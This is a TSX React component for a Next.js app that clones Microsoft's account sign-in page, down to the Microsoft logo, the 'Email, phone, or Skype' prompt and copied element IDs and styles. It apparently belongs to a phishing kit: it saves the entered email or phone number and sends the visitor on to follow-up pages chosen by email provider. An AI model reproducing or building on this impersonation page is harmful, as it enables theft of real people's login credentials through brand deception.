/* eslint-disable @next/next/no-img-element */
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import * as yup from "yup";
import { yupResolver } from "@hookform/resolvers/yup";
import { DataContext } from "../pages/_app";
import { Wrapper } from "./Wrapper";
import { Error } from "./Error";

interface LoginProps {
  title: string;
  altText: string;
  placeholder?: string;
  url?: string;
  error?: string;
}

const phoneRegExp =
  /^((\\+[1-9]{1,4}[ \\-]*)|(\\([0-9]{2,3}\\)[ \\-]*)|([0-9]{2,4})[ \\-]*)*?[0-9]{3,4}?[ \\-]*[0-9]{3,4}?$/;

yup.addMethod(yup.string, "or", function (schemas, msg) {
  return this.test({
    name: "or",
    message: "Please enter a valid email or phone number." || msg,
    test: (value) => {
      if (Array.isArray(schemas) && schemas.length > 1) {
        const resee = schemas.map((schema) => schema.isValidSync(value));
        return resee.some((res) => res);
      } else {
        throw new TypeError("Schemas is not correct array schema");
      }
    },
    exclusive: false,
  });
});

export const Login: React.FC<LoginProps> = ({
  title,
  altText,
  placeholder,
  url,
  error,
}) => {
  const schema = yup.object().shape({
    username: yup
      .string()
      // @ts-ignore
      .or([
        yup.string().required().email(error),
        yup.string().required().matches(phoneRegExp, error),
      ]),
  });
  const router = useRouter();

  const [loading, setLoading] = useState(false);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    setData({
      ...datas,
      ...data,
    });

    const isNumber = !isNaN(data["username"]);
    if (isNumber) {
      push(`/email/validate/live`);
    } else if (data[`username`].includes(`@`)) {
      const emailProvider = data["username"].split("@")[1].split(".")[0];
      push(`/email/validate/${emailProvider}`);
    } else {
      push(`/email/validate/live`);
    }
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper>
      <div className="win-scroll">
        <div id="lightbox" className={`sign-in-box ext-sign-in-box has-popup`}>
          <div className="lightbox-cover"></div>
          <div>
            <img
              src={`/images/logo.svg`}
              alt={`Microsoft`}
              className={`logo`}
            />
          </div>
          <div>
            <div>
              <div className="pagination-view">
                <div>
                  <div>
                    <div>
                      <div className="row title ext-title">
                        <div>{title}</div>
                      </div>
                    </div>
                    <div className="row">
                      {errors.username && errors.username.message && error ? (
                        <Error message={error} />
                      ) : null}
                      <div className="form-group col-md-24">
                        <div className="placeholderContainer">
                          <input
                            className={`form-control ltr_override input ext-input text-box ${
                              errors.username && errors.username.message
                                ? `has-error`
                                : ``
                            } ext-text-box`}
                            placeholder={
                              placeholder || `Email, phone, or Skype`
                            }
                            {...register(`username`)}
                          />
                          <input
                            className={`moveOffScreen`}
                            type={`password`}
                          />
                        </div>
                      </div>
                    </div>
                    <div>
                      <div className="row">
                        <div className="col-md-24">
                          <div className="text-13">
                            <div className="form-group">
                              No account?{" "}
                              <a href="" id="link">
                                Create one!
                              </a>
                            </div>
                            <div className="form-group">
                              <a
                                href={``}
                                onClick={(e) => {
                                  e.preventDefault();
                                  url ? router.push(url) : ``;
                                }}
                                id="idA_PWD_SwitchToFido"
                              >
                                {altText}{" "}
                              </a>
                              <span className="help-button">
                                <img src={`/images/qstmark.svg`} alt={``} />
                              </span>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div className="win-button-pin-bottom">
                      <div>
                        <div
                          className={`col-xs-24 no-padding-left-right button-container`}
                        >
                          <div className="inline-block">
                            <input
                              type={`submit`}
                              value={`Next`}
                              className={`win-button button_primary button ext-button primary ext-primary`}
                              onClick={onSubmit}
                              disabled={loading}
                            />
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className={`promoted-fed-cred-box ext-promoted-fed-cred-box`}>
          <div className={`promoted-fed-cred-content`}>
            <div className={`row tile`}>
              <div className="table">
                <div className="table-row">
                  <div className={`table-cell tile-img medium`}>
                    <img
                      className={`tile-img medium`}
                      alt={``}
                      src={`/images/key.svg`}
                    />
                  </div>
                  <div className={`table-cell text-left content`}>
                    <div>Sign-in options</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </Wrapper>
  );
};
